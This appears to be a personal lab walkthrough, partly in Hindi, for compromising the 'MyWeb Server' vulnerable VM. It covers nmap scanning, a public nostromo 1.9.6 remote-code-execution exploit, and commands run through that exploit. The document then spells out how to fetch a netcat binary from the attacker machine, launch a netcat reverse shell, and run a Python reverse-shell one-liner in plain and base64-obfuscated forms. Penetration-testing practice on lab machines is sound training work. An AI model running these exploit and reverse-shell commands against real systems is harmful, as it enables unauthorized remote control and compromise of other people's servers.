<div class="page">

# MyWeb Server

\

## 

## MyWeb Server

- **<span style="color:#663e0e;">MyWeb Server</span>** :-

<!-- -->

- <span style="color:#3584e4;">Download the machine and import in vm
  box</span> :

<!-- -->

- Go to repo :
  <https://github.com/InfoSecWarrior/Offensive-Pentesting-Lab/tree/main/Vulnerable-OVA>

![](images/5-1.png)

- Download the machine :

![](images/5-2.png)

![](images/5-3.png)

- Import the machine in virtual box :

![](images/5-4.png)

![](images/5-5.png)

![](images/5-6.png)

- Automatic assign IP to the machine :

![](images/5-7.png)

- <span style="color:#3584e4;">Run nmap command to scan</span> :

<div class="codebox">

    nmap -v -p- 192.168.2.248

</div>

![](images/5-8.png)

- Output file save :

<div class="codebox">

    nmap -v -sT -sV -sC -A -p- 192.168.2.248 -oA my-web-server.txt

</div>

![](images/5-9.png)

- Connect to an HTTP Server on Port 80 :

<div class="codebox">

    nc 192.168.2.248 80

</div>

![](images/5-10.png)

- Connect with Verbose Output :

<div class="codebox">

    nc -v 192.168.2.248 80

</div>

![](images/5-11.png)

- Check port for vulnerability and every port take 15 min :

![](images/5-12.png)

- <span style="color:#3584e4;">Check version search in google</span> :

Apache httpd 2.4.38 ((Debian)) exploit

![](images/5-13.png)

![](images/5-14.png) Iss port me kuch v nhi h ye fix h .

nostromo 1.9.6 exploit

![](images/5-15.png)

![](images/5-16.png) Isme ye bta rha h remote code execution h or
version v same h .

- Download the exploit :

![](images/5-17.png)

- Open the exploit in vim :

![](images/5-18.png)

- <span style="color:#3584e4;">Running the Exploit</span> :

<!-- -->

- Run this command :

<div class="codebox">

    python 47837.py 

</div>

![](images/5-19.png) Show the error

- Open this file 47837.py in vim : Edit the exploit if required (payload
  tuning, port changes, compatibility fixes).

<div class="codebox">

    vim 47837.py

</div>

![](images/5-20.png)

- Then run a python :

<div class="codebox">

    python 47837.py

</div>

![](images/5-21.png)

<div class="codebox">

    python2.7 47837.py

</div>

![](images/5-22.png)

- General Syntax : python 47837.py \<target_ip\> \<target_port\>
  \<command\>

<!-- -->

- Execute basic commands :

<div class="codebox">

    python2.7 47837.py 192.168.2.248 2222 id

</div>

![](images/5-23.png) id command execute .

<div class="codebox">

    python2.7 47837.py 192.168.2.248 2222 'ip a'

</div>

<div class="codebox">

    python2.7 47837.py 192.168.2.248 2222 'pwd'

</div>

<div class="codebox">

    python 47837.py 192.168.2.248 2222 "uname -a"

</div>

<div class="codebox">

    python2.7 47837.py 192.168.2.248 2222 "which nc"

</div>

<div class="codebox">

    python2.7 47837.py 192.168.2.248 2222 "php -v"

</div>

<div class="codebox">

    python2.7 47837.py 192.168.2.248 2222 "which python"

</div>

Note :- Yha tk vulnerability mil gyi or exploit v ho gyi .

- <span style="color:#3584e4;">Reverse Shell Techniques</span> :

<!-- -->

- Download this binaries : (nc32 , nc64) :
  [https://github.com/H74N/netcat-binaries/blob/master/build](https://github.com/H74N/netcat-binaries/blob/master/build/nc32)

![](images/5-24.png)

<https://github.com/H74N/netcat-binaries/blob/master/build/nc32>

![](images/5-25.png)

<https://github.com/H74N/netcat-binaries/blob/master/build/nc64>

![](images/5-26.png)

![](images/5-27.png)

<div class="codebox">

    sudo mv -v nc32 nc64 /opt/nc

</div>

![](images/5-28.png)

- Then go terminal and run python server on location :

<div class="codebox">

    cd /opt/nc

</div>

- 

<div class="codebox">

    sudo python3 -m http.server 443

</div>

![](images/5-29.png) get request aani chahiye .

- Upload Netcat binary :

<div class="codebox">

    python2.7 47837.py 192.168.2.248 2222 "wget http://192.168.2.219:443/nc64 -O /tmp/nc64"

</div>

![](images/5-30.png)

<div class="codebox">

    python2.7 47837.py 192.168.2.248 2222 "ls -lh /tmp/"

</div>

![](images/5-31.png)

<div class="codebox">

    python2.7 47837.py 192.168.2.248 2222 "chmod +x /tmp/nc64"

</div>

![](images/5-32.png)

- Launch Netcat reverse shell :

<div class="codebox">

    python2.7 47837.py 192.168.2.248 2222 "/tmp/nc64 -e /bin/bash 192.168.2.219 443"

</div>

- Listener on attacker machine :

<div class="codebox">

    nc -nlvp 443

</div>

![](images/5-33.png) reverse shell mil gya h .

- If nc is not install in server side then any language ( like : python
  ) install it then take a reverse shell .

<!-- -->

- <span style="color:#3584e4;">Reverse Shell Generator</span> :

<!-- -->

- Visit the link : <https://www.revshells.com/>

![](images/5-34.png) Copy and paste in base64 and encode the value .

- In base64 :

<div class="codebox">

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.219",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

</div>

<https://www.base64encode.org/>

![](images/5-35.png)

![](images/5-36.png)

- Base64-Encoded Python Reverse Shell :

<div class="codebox">

    python2.7 47837.py 192.168.2.248 2222 "echo 'cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4yLjIxOSIsNDQzKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKSc=' | base64 -d | bash"

</div>

<div class="codebox">

    nc -nlvp 443

</div>

![](images/5-37.png)

![](images/5-38.png) Reverse shell mil gya .

</div>
